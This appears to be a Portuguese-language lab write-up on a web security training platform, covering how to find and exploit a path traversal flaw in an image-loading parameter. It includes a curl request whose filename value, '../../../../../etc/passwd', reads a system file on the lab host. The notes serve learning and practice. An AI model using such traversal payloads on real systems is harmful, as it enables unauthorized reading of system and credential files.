

Primeiro passo é identificar o entry point nesse caso, podendo ser na URL ou em parâmetro de imagens, por exemplo. Na descrição do problema já sabemos que se trata de um parâmetro que carrega as imagens da aplicação. Para identificá-lo, basta executar:

(Importante ressaltar que o cookie informado por meio do curl é por conta da sessão de laboratório estabelecida para meu usuário Academy)

```
curl -H "Cookie: session=HBM2GnZWIIKHhMfiRJ0LZdAau9mSAJoK" -s https://0adb007804c5a068821e0c71003600e6.web-security-academy.net/ | ./extract.rb
```

![](../../../../media/Pasted%20image%2020240728130136.png)

Opções de payload.

```
curl https://0adb007804c5a068821e0c71003600e6.web-security-academy.net/image?filename=../../../../../etc/passwd
```

![](../../../../media/Pasted%20image%2020240728130217.png)


![](../../../../media/Pasted%20image%2020240728130103.png)